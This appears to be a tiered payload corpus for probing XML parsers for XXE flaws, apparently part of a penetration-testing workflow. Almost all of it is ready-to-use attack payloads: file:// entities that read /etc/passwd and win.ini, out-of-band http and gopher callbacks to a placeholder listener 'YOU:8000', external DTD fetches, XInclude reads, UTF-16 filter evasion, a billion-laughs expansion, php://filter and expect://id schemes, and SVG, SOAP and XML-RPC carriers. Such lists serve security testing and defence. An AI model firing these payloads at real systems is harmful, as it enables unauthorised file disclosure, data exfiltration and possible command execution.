# Detection Payloads — the probe corpus

## Tier 0 — parse-detection (no entities)

```xml
<?xml version="1.0"?><r>x</r>                    — clean
<?xml version="1.0"?><r>                        — malformed — does it error?
<r><a></r>                                      — mismatched tags — error?
&<>                                             — bare special-chars
```

A parse-error on malformed XML = a parser exists. A 200/echo = no
parser or a forgiving one.

## Tier 1 — internal-entity (expansion oracle)

```xml
<!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r>&probe;</r>
<!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r a="&probe;"/>
<!DOCTYPE r [<!ENTITY probe "&#88;&#88;&#69;">]><r>&probe;</r>   — char-ref value
```

`XXE_PROBE`/`XXE` echo = expansion live.

## Tier 2 — entity-lookup (did it check?)

```xml
<r>&undefined;</r>
<r>&nonexistent;</r>
```

The `Entity 'x' not defined`-style error = the parser CHECKED for the
entity — expansion-config is the wall — different from "no parser".

## Tier 3 — param-entity (DTD-live oracle)

```xml
<!DOCTYPE r [<!ENTITY % p "x">%p;]><r/>
<!DOCTYPE r [<!ENTITY % p "<!ENTITY x 'PARAM_OK'>">%p;]><r>&x;</r>
```

The second form — `%p;` declares `x` — `&x;` echoes `PARAM_OK` —
param-entities expand inside the DTD.

## Tier 4 — external-entity `file:` (read oracle)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///definitely-not-xyz">]><r>&x;</r>
```

The last — a nonexistent file — the FileNotFound URI proves the fetch
attempted — error-vs-empty distinguishes "no file" from "no fetch".

## Tier 5 — external-entity `http:` (OOB oracle)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://YOU:8000/hit">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "http://nonexistent.invalid/x">]><r>&x;</r>
```

The listener-hit vs the error — the egress oracle.

## Tier 6 — external-param + DTD-fetch (blind oracle)

```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU:8000/x.dtd">%d;]><r/>
<!DOCTYPE r [<!ENTITY % d SYSTEM "file:///nonexistent.dtd">%d;]><r/>
```

The DTD-fetch — a listener-hit or an error — param-entity-external
liveness.

## Tier 7 — the XInclude oracle

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://YOU:8000/hit" parse="text"/>
</r>
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///nonexist" parse="text"><xi:fallback>FB</xi:fallback></xi:include>
</r>
```

`FB` in the response = XInclude processed, file didn't exist.

## Tier 8 — the encoding-disguise oracle

```xml
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY probe "P">]><r>&probe;</r>
```

Encoded as UTF-16 — the filter sees bytes, the parser decodes.

## Tier 9 — the Billion-Laughs-minimal oracle

```xml
<!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;&a;&a;">]><r>&b;</r>
```

`xxxxx` — the expansion oracle.

## Tier 10 — the protocol-scheme oracle

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "data:,data-test">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "jar:file:///x.jar!/y">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "netdoc:///etc/passwd">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "gopher://YOU:8000/_">]><r>&x;</r>
```

Each scheme resolves on a subset — which one resolves fingerprints the
parser.

## Tier 11 — the error-fingerprint probes

```xml
<r>&undefined;</r>
<r><a></r>                                       — mismatched
<!DOCTYPE r []><r/>                              — empty-DOCTYPE — allowed?
<!DOCTYPE r [%undefined;]><r/>                  — undefined-param — error?
<!DOCTYPE r [<!ENTITY x "&x;">]><r>&x;</r>      — self-ref — loop-error
```

## Tier 12 — the container-surface probes

```xml
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
```

For SVG/upload surfaces — `svg-xxe.md`.

## Tier 13 — the soap/xmlrpc probes

```xml
<soap:Envelope xmlns:soap="...">
  <soap:Body><m:m xmlns:m="u"><m:p>&x;</m:p></m:m></soap:Body>
</soap:Envelope>
<methodCall><methodName>m</methodName><params><param><value>&x;</value></param></params></methodCall>
```

## The record-per-probe

Each probe → one `post-probe` — `verdict` + `evidence` + `response` —
the oracle-chain builds the surface-map.
